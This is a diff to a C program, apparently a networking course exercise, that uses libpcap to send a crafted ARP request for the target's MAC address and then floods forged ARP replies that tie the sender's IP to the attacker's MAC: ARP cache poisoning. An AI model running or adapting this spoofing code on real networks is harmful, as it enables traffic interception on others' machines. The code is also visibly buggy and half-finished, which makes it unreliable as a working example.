@@ -5,6 +5,8 @@
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <netinet/if_ether.h>
+#include "get.c"
+
 
 
 int main(int argc, char *argv[])
@@ -25,8 +27,13 @@ int main(int argc, char *argv[])
 	struct ether_arp* arp;
 	const uint8_t* sender_ip;
 	const uint8_t* target_ip;
-	u_char arp_buf[60]={0,0,};
+	//u_char arp_buf[60]={0,0,};
+	u_char arp_buf[60]="\xff\xff\xff\xff\xff\xff\x8c\x85\x90\x0c\xe5\x60\x08\x06\x00\x01\x08\x00\x06\x04\x00\x01\x8c\x85\x90\x0c\xe5\x60\x0a\x01\x01\x75\x00\x00\x00\x00\x00\x00\x0a\x01\x01\x01";
+
+	packet=arp_buf;
+
 	int count=0;
+	uint8_t mymac[6];
 //	u_char arp_r_buf[60]={0,}
 	/* Define the device */
 
@@ -36,7 +43,7 @@ int main(int argc, char *argv[])
 
 
 
-	handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
+	handle = pcap_open_live(argv[1], BUFSIZ, 1, 10, errbuf);
 	
 	if (handle == NULL) {
 		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
@@ -59,10 +66,57 @@ int main(int argc, char *argv[])
 
 	target_ip=argv[3];
 
+
+	ethr=(struct libnet_ethernet_hdr*)(arp_buf);
+
+	arp=((struct ether_arp*)&arp_buf[sizeof(struct libnet_ethernet_hdr)]);
+
+
+	
+
 	while(1)
 	{
 	int chk=1;
 	res = pcap_next_ex(handle, &header, &packet);
+
+	strncpy(myd,argv[1],strlen(argv[1]));
+
+  	myd[strlen(argv[1])]='\0';
+
+  	getip(ip_addr,myd);
+
+  	getmac(mymac);
+
+	memcpy(ethr->ether_shost,mymac,6);
+
+	memcpy(arp->arp_sha,mymac,6);
+	
+	inet_pton(AF_INET,target_ip,&(arp->arp_tpa));
+	
+	inet_pton(AF_INET,ip_addr,&(arp->arp_spa));
+
+
+
+	for(int i=0;i<5;i++)
+	{
+
+	if((pcap_sendpacket(handle, arp_buf,42))==0)
+		{
+		
+		printf("Request!\n");
+	
+		for(int j=0;j<42;j++)
+			{
+			printf("%02x ",(arp_buf[j]));
+			if((j+1)%16==0&&j!=0)
+			printf("\n");
+			}
+			printf("\n\n\n\n");
+		
+		}
+	}
+
+
 	
 	if(res<1)
 	{
@@ -81,12 +135,15 @@ int main(int argc, char *argv[])
 
 	else
 
-	/* Print its length */
+	ethr=(struct libnet_ethernet_hdr*)packet;
+
+  	arp=((struct ether_arp*)&packet[sizeof(struct libnet_ethernet_hdr)]);
+
 	//printf("Jacked a packet with length of [%d]\n", header->len);
 	
 	printf("===========================================================================\n");
 	
-	ethr=(struct libnet_ethernet_hdr*)(packet);
+//	ethr=(struct libnet_ethernet_hdr*)(packet);
 	
 	
 	printf("eth.dmac %02x:%02x:%02x:%02x:%02x:%02x   \n",ethr->ether_dhost[0],ethr->ether_dhost[1],ethr->ether_dhost[2],ethr->ether_dhost[3],ethr->ether_dhost[4],ethr->ether_dhost[5]);
@@ -96,25 +153,25 @@ int main(int argc, char *argv[])
 	printf("eth.smac %02x:%02x:%02x:%02x:%02x:%02x   \n",ethr->ether_shost[0],ethr->ether_shost[1],ethr->ether_shost[2],ethr->ether_shost[3],ethr->ether_shost[4],ethr->ether_shost[5]);
 	
 
-	(ethr->ether_type)=ntohs(ethr->ether_type);
+	//(ethr->ether_type)=ntohs(ethr->ether_type);
 
 	printf("ether_type : %x \n",ethr->ether_type);
 
 	printf("===========================================================================\n");
 //	if(ethr->ether_type!=ETHERTYPE_IP){printf("It doesn't seem IP Packet\n");continue;}
 
-	if(ethr->ether_type!=ETHERTYPE_ARP){printf("It doesn't seem ARP Packet\n");continue;}
+	if(ntohs(ethr->ether_type)!=ETHERTYPE_ARP){printf("It doesn't seem ARP Packet\n");continue;}
+	
+	if(strcmp(ip_addr,target_ip),arp->arp_op)
+	
+	break;
 
-	arp=((struct ether_arp*)&packet[sizeof(struct libnet_ethernet_hdr)]);
+//	arp=((struct ether_arp*)&packet[sizeof(struct libnet_ethernet_hdr)]);
 			
 	inet_ntop(AF_INET,(arp->arp_spa),ip_addr,INET_ADDRSTRLEN);
 
 	printf("ip.src : %s\n",ip_addr);
 
-	chk=strcmp(ip_addr,sender_ip);
-
-	printf("compare%d\n",chk);
-	
 	inet_ntop(AF_INET,&(arp->arp_tpa),ip_addr,INET_ADDRSTRLEN);
 
 	printf("ip.dst : %s\n",ip_addr);
@@ -131,19 +188,12 @@ int main(int argc, char *argv[])
 //	arp->arp_op=ntohs(arp->arp_op);
 
 
-	printf("%x\n\n**%d**",arp->arp_hrd,sizeof(struct ether_arp));
-	if(ntohs(arp->arp_op)==ARPOP_REQUEST)
-		{
-			printf("It is arp request packet%x\n\n%d %x\n",ntohs(arp->arp_op),ethr->ether_dhost[0],ethr->ether_dhost[0]); 
-			if(chk==0) 
-			{
-			printf("Got The Spoof request packet\n");
-			break;
-			}
-		}
-	else if(ntohs(arp->arp_op)==ARPOP_REPLY) {printf("It is arp reply packet\n\n"); }
+//	printf("%x\n\n**%d**",arp->arp_hrd,sizeof(struct ether_arp));
 
-	else {printf("It dosen't seem arp packet\n\n"); continue;}
+
+	if(ntohs(arp->arp_op)==ARPOP_REPLY||htons(arp->arp_op)==ARPOP_REPLY) {printf("It is arp reply packet%x\n\n");printf("!!!!!%d!!!!!\n",strcmp(ip_addr,target_ip),arp->arp_op); break;}
+
+	else {printf("It dosen't seem reply packet%x\n\n",arp->arp_op); continue;}
 
 		
 	
@@ -167,7 +217,7 @@ int main(int argc, char *argv[])
 	
 //	ip->ip_len=ntohs(ip->ip_len);
 	
-	printf("===========================================================================\n");
+//	printf("===========================================================================\n");
 
 
 
@@ -175,50 +225,46 @@ int main(int argc, char *argv[])
 //	
 //	printf("ip_len : %d\n",ip->ip_len);
 	
-/*	int k=sizeof(struct libnet_ethernet_hdr)+(ip->ip_hl+tcp->th_off)*4;
+///	int k=sizeof(struct libnet_ethernet_hdr)+(ip->ip_hl+tcp->th_off)*4;
 
-	printf("DATA\n\n");	
+//	printf("DATA\n\n");	
 
-	int size_data=ip->ip_len-(tcp->th_off+ip->ip_hl)*4;
+//	int size_data=ip->ip_len-(tcp->th_off+ip->ip_hl)*4;
 		
-	for(int i=0;i<size_data;i++)
-		printf("%c",packet[k++]);
+//	for(int i=0;i<size_data;i++)
+//		printf("%c",packet[k++]);
 	
-	printf("\n");
+//	printf("\n");
 
 	
-	printf("===========================================================================\n");
+//	printf("===========================================================================\n");
 	
 	
-	printf("\n\n\n\n\n\n");
-*/	
+//	printf("\n\n\n\n\n\n");
+	
+	
 
 
 	}
+	
+	strncpy(myd,argv[1],strlen(argv[1]));
 
-	ethr->ether_dhost[0]=0xff;
-	ethr->ether_dhost[1]=0xff;
-	ethr->ether_dhost[2]=0xff;
-	ethr->ether_dhost[3]=0xff;
-	ethr->ether_dhost[4]=0xff;
-	ethr->ether_dhost[5]=0xff;
-
+  	myd[strlen(argv[1])]='\0';
+	
 	inet_pton(AF_INET,target_ip,&(arp->arp_tpa));
 	
 	inet_pton(AF_INET,sender_ip,&(arp->arp_spa));
 
-
-	//arp->arp_op=htons(arp->arp_op);
-
-	ethr->ether_type=htons(ethr->ether_type);
-
-	*(uint32_t*)(ethr->ether_shost)=*(uint32_t*)(ethr->ether_shost);
+	arp->arp_op=htons(ARPOP_REPLY);
+	
+	memcpy(ethr->ether_shost,mymac,6);
 
 	memcpy(arp_buf, packet, 42);
 
+	
 	while(1)
 	{
-	
+
 	if((pcap_sendpacket(handle, arp_buf,42))==0)
 		{
 		
@@ -242,6 +288,7 @@ int main(int argc, char *argv[])
 	}
 
 	pcap_close(handle);
+
 	
 	return 0;
 	
